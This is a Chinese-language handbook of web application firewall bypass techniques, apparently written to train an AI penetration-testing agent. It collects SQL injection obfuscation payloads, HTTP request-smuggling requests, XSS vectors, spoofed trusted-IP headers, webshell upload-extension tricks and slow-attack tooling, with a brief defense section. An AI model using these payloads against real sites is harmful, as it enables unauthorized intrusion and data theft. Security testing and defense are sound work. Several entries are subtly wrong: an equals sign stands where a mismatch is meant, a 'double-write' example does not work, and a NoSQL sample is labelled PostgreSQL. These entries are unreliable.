# WAF 绕过技术完整手册

> 用途：供安全测试 Agent 逐条学习
> ⚠️ 仅限合法授权的渗透测试、红队评估、安全研究与防御建设。未经授权对任何系统实施攻击是违法行为。授权范围内仅做漏洞存在性验证 + 最小样本，不拖库、不传 webshell、不执行命令。

---

# 第一篇：WAF 检测原理（先懂 WAF 才能绕过）

## 一、WAF 的检测层次

**1. 黑名单 / 签名匹配**
基于正则规则匹配已知攻击特征（如 `union select`、`<script>`、`../`）。最基础，也最容易被混淆绕过。

**2. 协议规范化检测**
解码 URL 编码、大小写归一化后再匹配。能挡一部分简单编码，但规范化不彻底即可绕过。

**3. 语义 / 语法分析**
解析 SQL 语法树、HTML 结构，判断是否构成真实攻击语义。比字符串匹配强，但对解析差异敏感。

**4. 行为分析 / 速率检测**
基于请求频率、来源 IP、User-Agent 等行为特征。拦暴力破解和扫描器，但对慢速/分布式无效。

**5. AI / ML 模型**
用机器学习判断恶意流量。对训练集外的对抗样本有盲区。

## 二、WAF 的固有弱点（绕过的理论基础）

**6. 核心矛盾：WAF 与后端解析不一致**
WAF 看到的请求 = 后端实际执行的请求，是绕过的基础。任何解析差异（编码、协议、Content-Type、参数解析顺序）都可被利用。

**7. 性能上限导致检测不完整**
WAF 只能扫描请求的前 N 字节（扫描阈值），超长请求可把恶意 payload 推到阈值之外。

**8. 规范化不彻底**
WAF 解码次数、字符集处理、Unicode 归一化与后端不一致。

---

# 第二篇：编码与混淆绕过

## 一、URL 编码类

**9. URL 编码**
```http
' → %27   空格 → %20   < → %3C
```

**10. 双重编码（Double URL Encoding）**
WAF 只解码一次，后端解码两次。
```
%25%32%37 → %27 → '     # %25 = %，%32 = 2，%37 = 7
```

**11. 三重编码**
```http
%252527 → %27 → '
```

**12. Unicode 编码**
```http
%u0027 → '     # 部分 IIS/旧后端识别 %u 格式
```

## 二、Hex / Base64 编码类

**13. Hex 编码**
```sql
0x61646d696e = 'admin'
SELECT 0x73656c656374   # 掩盖 SELECT
```

**14. Base64 编码**
```bash
echo "d2hvYW1p" | base64 -d   # 掩盖 whoami
```

**15. 混合编码**
URL 编码 + Base64 + Hex 叠加，迫使 WAF 多轮解码。

## 三、大小写与关键字混淆

**16. 大小写混用**
```sql
sElEcT * fRoM users
UnIoN SeLeCt
```

**17. 关键字拆分 + 注释**
```sql
se/**/lect
uni/**/on sel/**/ect
```

**18. 换行符插入**
```sql
se%0alect      # %0a = 换行
uni%0aon sel%0aect
```

**19. 双写绕过（WAF 只替换一次）**
```sql
SelEctect      # 替换 select 后剩 select
uniunionon
```

**20. Unicode 全角字符**
```sql
ＳＥＬＥＣＴ　＊　ＦＲＯＭ　ｕｓｅｒｓ
```

**21. 同义关键字替换**
```sql
/* SQL 同义 */
SELECT → SELECT（不变）；空格 → /**/

/* 命令同义 */
cat → tac、head、more、less、dd
whoami → id -un、w、logname
```

## 四、空格与分隔符替换

**22. 注释替代空格**
```sql
SELECT/**/username/**/FROM/**/users
```

**23. 反引号替代**
```sql
SELECT`username`FROM`users`
```

**24. 括号替代**
```sql
SELECT(username)FROM(users)
```

**25. 空白字符集（tab/换行/垂直 tab/换页/回车/不换行空格）**
```sql
%09  %0a  %0b  %0c  %0d  %a0
```

**26. 加号替代空格**
```sql
SELECT+username+FROM+users
```

## 五、等号与引号替换

**27. 等号替换**
```sql
WHERE id LIKE 1
WHERE id BETWEEN 1 AND 1
WHERE id IN(1)
WHERE NOT id>1 AND NOT id<1
```

**28. 引号替换**
```sql
WHERE username=0x61646d696e                    # Hex
WHERE username=CHAR(97,100,109,105,110)        # CHAR 函数
```

---

# 第三篇：HTTP 协议层绕过

## 一、HTTP 请求走私（Request Smuggling）

**29. 原理**
利用前端代理（WAF/负载均衡）与后端对请求边界解析不一致，夹带第二个请求，使 WAF 只看到无害的第一个请求，后端却处理夹带的恶意请求。

**30. CL.TE 走私（前端 Content-Length，后端 Transfer-Encoding）**
```http
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```

**31. TE.CL 走私（前端 Transfer-Encoding，后端 Content-Length）**
```http
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST / HTTP/1.1
```

**32. TE.TE 走私（两端都支持 TE，混淆 chunked 大小写/空格）**
```http
Transfer-Encoding: chunked
Transfer-Encoding: xchunked     # 前端识别 chunked，后端跳过
```

**33. 危害**
未授权访问敏感信息、会话劫持、缓存投毒、绕过 WAF 检测。

## 二、HTTP 参数污染（Parameter Pollution）

**34. 原理**
注入重复参数，使 WAF 与后端解析逻辑不一致——WAF 检测第一个，后端用第二个（或反之）。

```http
?id=1&id=2 union select...
# WAF 看第一个 id=1 无害；后端取最后一个 id=2 union select
```

**35. 不同平台参数解析差异**
| 平台 | 重复参数取值 |
|------|-------------|
| PHP/Apache | 最后一个 |
| ASP.NET | 逗号拼接 |
| JSP/Tomcat | 第一个 |
| Node.js | 取决于框架 |

## 三、分块传输编码（Chunked Transfer Encoding）

**36. 原理**
把恶意 payload 拆成多个 chunk 传输，绕过基于完整报文的正则匹配。

```http
POST / HTTP/1.1
Transfer-Encoding: chunked

4
sele
4
ct *
0
```

**37. 分块混淆变体**
- chunk 大小加注释、分号、空格
- chunk 间插入换行

## 四、Content-Type 混淆

**38. 原理**
WAF 规则针对特定 Content-Type（如 form-urlencoded），换用其他类型绕过。

```http
Content-Type: application/json          # JSON 嵌套 SQL 注入
Content-Type: multipart/form-data       # 分片 payload
Content-Type: application/xml           # XXE
Content-Type: text/xml
Content-Type: application/octet-stream
```

**39. 关键研究结论**
超过 **90% 的网站**可互换接受 `application/x-www-form-urlencoded` 和 `multipart/form-data`——这是普遍弱点。

## 五、HTTP 方法篡改

**40. 方法替换绕过**
```http
GET → POST / PUT / PATCH / OPTIONS / HEAD
# 部分 WAF 只检测 GET/POST
```

**41. 方法覆盖**
```http
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
```

## 六、HTTP 版本 / 行尾混淆

**42. HTTP/0.9 或异常版本**
```http
GET / HTTP/0.9
```

**43. 行尾混淆（LF/CRLF/混合）**
```http
%0d%0a / %0a / %0d 组合
```

---

# 第四篇：解析差异利用（Parsing Discrepancy）

**44. 核心思路**
针对 Header 和请求体非恶意组件，结合多种 Content-Type，制造 WAF 与后端解析差异。

**45. 研究数据**
在 AWS、Azure、Cloud Armor、Cloudflare、ModSecurity 5 个 WAF 中确认 **1207 个绕过案例**。

**46. 常见解析差异点**
- 参数分隔符（`&` vs `;` vs 自定义）
- 注释处理（`#`、`--`、`/**/` 语义）
- 编码解码顺序（先 URL decode 还是先规范化）
- JSON 键值解析（重复 key、嵌套结构）

---

# 第五篇：Payload 填充与超限（Padding Attack）

**47. 原理**
WAF 只检查请求前 N 字节，通过填充超长内容把恶意 payload 推到扫描阈值之外。

**48. 手法**
- Header 区塞入超长无害字段
- Payload 前填充大量空白/注释/垃圾字符
- 结合慢速传输逐步送达

```http
GET /?id=1[超长垃圾参数][真实恶意payload] HTTP/1.1
X-Padding: AAAAAAAAAA...(数万字节)
```

---

# 第六篇：白名单 / IP 欺骗绕过

**49. 原理**
伪造来源 IP 相关 Header，冒充受信任 IP 绕过 IP 白名单/黑名单。

**50. 常见伪造 Header**
```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Forwarded-For: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

**51. 判断 WAF 信任哪个 Header**
- 观察后端日志/回显的 IP
- 访问控制是否随 Header 变化

**52. 其他白名单绕过**
- 构造异常数据包试探
- 增加负载绕过规则阈值

---

# 第七篇：加密与 TLS 隧道

**53. 原理**
WAF 无法解密加密 payload，则恶意内容不经检查直接通过。

**54. 场景**
- 自定义 TLS 加密通道传输攻击请求
- WAF 作为透明代理（非 TLS 终结点）时，加密流量直通
- HTTP/2、HTTP/3 隧道

**55. 限制**
前提是 WAF 不解密 TLS（如纯 IP 层转发、不终止 HTTPS）。

---

# 第八篇：慢速 / 分布式攻击

**56. 原理**
放慢攻击速率、分散到多 IP，模拟正常流量，绕过速率检测与行为分析模型。

**57. 工具**
- Slowloris：慢速 HTTP 连接耗尽
- SlowHTTPTest：慢速读写
- 随机时间间隔脚本

**58. 分布式**
- 多 IP / 代理池轮换
- 请求间随机间隔，规避行为模型

---

# 第九篇：应用层与数据库层绕过

## 一、JSON 嵌套注入

**59. JSON 嵌套 SQL 注入**
利用 JSON 结构绕过 AWS WAF 等检测，如 PostgreSQL JSON 函数注入。

```json
{"id": {"$gt": 1}, "name": {"$ne": null}}
```

## 二、XSS 语义伪装

**60. HTML 实体编码**
```html
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
```

**61. 语义混淆**
```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
```

## 三、文件上传混淆

**62. 双文件上传**
上传两个文件，WAF 只扫描第一个，后端处理第二个。

**63. NTFS ADS（数据流）特性**
```http
file.php::$DATA     # Windows NTFS 数据流绕过
```

**64. 扩展名/Content-Type 混淆**
```
shell.php → shell.pHp / shell.php.jpg / shell.asp;.jpg
Content-Type: image/jpeg（实际内容为脚本）
```

---

# 第十篇：AI/ML 模型对抗

**65. 原理**
现代 WAF 引入 ML/行为分析，攻击者使用对抗性 payload 生成技术，针对模型盲区构造样本。

**66. 手法**
- 训练集外特征（罕见编码、罕见组合）
- 语义等价但语法变形的 payload
- 逐步逼近，探测模型决策边界

---

# 第十一篇：各主流 WAF 针对性绕过要点

**67. Cloudflare**
- 重点绕过其规范化规则；换 Content-Type、分块传输、参数污染
- 研究指出其存在解析差异绕过

**68. AWS WAF**
- JSON 嵌套 SQL 注入（PostgreSQL JSON 函数）已证实绕过
- 换用 multipart/form-data

**69. ModSecurity**
- 规则集（OWASP CRS）可被编码混淆、大小写、注释绕过
- CRS 版本过旧是主要弱点

**70. Azure / Cloud Armor**
- 解析差异利用（1207 案例研究覆盖）

**71. 国内 WAF（山石/知道创宇/长亭等）**
- 常见：内联注释 `sel/**/ect` 绕过 SQL 关键字规则（本机实战验证）
- 参数污染、分块传输、IP 伪造通用

---

# 第十二篇：工具

**72. 通用**
- Burp Suite（Intruder/Turbo Intruder 并发绕过速率）
- sqlmap `--tamper` 脚本（内置大量绕过脚本）

**73. 专用 WAF 绕过工具**
- wafw00f（WAF 指纹识别）
- waf-bypass 类脚本
- 自编 tamper 脚本

**74. 慢速攻击**
- Slowloris、SlowHTTPTest、GoldenEye

---

# 第十三篇：防御建议

**75. 分层防御**
WAF 只是第一层，非唯一控制手段。

**76. Content-Type 强校验**
拒绝意外或不匹配的 Content-Type。

**77. 规则持续更新**
过时规则 = 易被绕过。

**78. 规范化处理**
使用 HTTP-Normalizer 类工具，严格按 RFC 标准验证 HTTP 请求。

**79. 持续监控**
保持 WAF 规则更新、正确配置，持续监控可疑活动。

**80. 后端同样防御**
WAF 不能替代后端输入校验、参数化查询、最小权限。

---

# 附录：能力分层参考

```
知道 URL 编码/大小写绕过          → 入门
会参数污染/分块传输/Content-Type   → 进阶
会请求走私/解析差异利用            → 高级
会对抗 AI/ML 模型 + 组合绕过       → 专家级
```

---

# 附录：关键术语速查

| 术语 | 含义 |
|------|------|
| WAF | Web 应用防火墙 |
| HRS | HTTP Request Smuggling 请求走私 |
| CL/TE | Content-Length / Transfer-Encoding |
| Chunked | 分块传输编码 |
| Parameter Pollution | 参数污染 |
| Parsing Discrepancy | 解析差异 |
| Padding Attack | 填充/超限攻击 |
| Double Encoding | 双重编码 |
| Content-Type Confusion | 内容类型混淆 |
| Slowloris | 慢速攻击工具 |
| NTFS ADS | NTFS 数据流 |
| IP Spoofing | IP 欺骗 |
| TLS Tunnel | TLS 隧道 |
| Adversarial Payload | 对抗性 payload |
